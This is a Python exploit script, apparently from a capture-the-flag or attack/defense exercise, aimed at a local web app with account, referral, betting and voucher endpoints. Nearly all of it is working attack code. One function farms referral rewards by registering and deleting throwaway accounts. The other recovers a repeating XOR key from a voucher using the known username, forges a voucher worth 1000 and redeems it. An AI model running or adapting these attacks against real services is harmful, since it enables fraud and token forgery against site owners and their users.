import requests
import string
import time
import re
import base64
import json

pattern = r'........-....-....-....-............'
s = requests.Session()

def register(ip, name, fcode=''):
    print("Register %s" % name)
    data = {'username': name,'password': 'pass','ip': '192.168.2.100','fcode': fcode}
    resp = requests.post('http://%s/register' % ip, data=data)
    codes = re.findall(pattern, resp.text)
    if len(codes) == 0:
        print(resp.text)
        return "error"
    else:
        return codes[0]

def verify(ip, code): 
    print("Verify")
    resp = requests.get("http://%s/verify?code=%s" % (ip, code))

def login(ip, name):
    print("Login %s" % name)
    data = {'username': name,'password': 'pass'}
    resp = s.post('http://%s/login' % ip, data=data)

def friend_code(ip):
    print("Get friend code")
    resp = s.get('http://%s/recruite' % ip)
    code = re.findall(r'>(.{32})<', resp.text)[0]
    return code

def delete_account(ip, name):
    data = {'username': name,'password': 'pass'}
    resp = s.post('http://%s/delete-account' % ip, data=data)

def get_voucher(ip):
    data = {'bet': 10}
    resp = s.post('http://%s/game2' % ip, data=data)
    code = re.findall(r'Voucher: (.*?)<', resp.text)[0]
    return code

def activate_voucher(ip, voucher):
    data = {'voucher': voucher}
    resp = s.post('http://%s/voucher' % ip, data=data)
    print(resp.text)

def exploit1():
    ip = '127.0.0.1:5000'

    code = register(ip, "H4x0r")
    verify(ip, code)
    login(ip, "H4x0r")
    code = friend_code(ip)

    for _ in range(20):
        ret = register(ip, "a", fcode=code)
        delete_account(ip, "a")
        time.sleep(0.5)
        login(ip, "H4x0r")
        time.sleep(0.5)

def exploit2():
    ip = '127.0.0.1:5000'
    name = 14*"a" + "c"
    code = register(ip, name)
    verify(ip, code)
    login(ip, name)
    code = get_voucher(ip)
    vdata = json.loads(base64.b64decode(code))
    ts = vdata['ts']
    block = bytes.fromhex(vdata['code'])[:12]
    key = "".join([chr(c ^ ord('a')) for c in block])
    print(key)

    res = ""
    for i, c in enumerate(bytes.fromhex(vdata['code'])):
        res += chr(c ^ ord(key[i%len(key)]))
    res = res.split(';')
    code = f"{name};1000;{res[2]}"

    res = ""
    for i, c in enumerate(code):
        res += chr(ord(c) ^ ord(key[i%len(key)]))
    vdata = {"ts":ts, "code":res.encode().hex()}
    time.sleep(1)
    voucher = base64.b64encode(json.dumps(vdata).encode())

    activate_voucher(ip, voucher)


# exploit1()
exploit2()
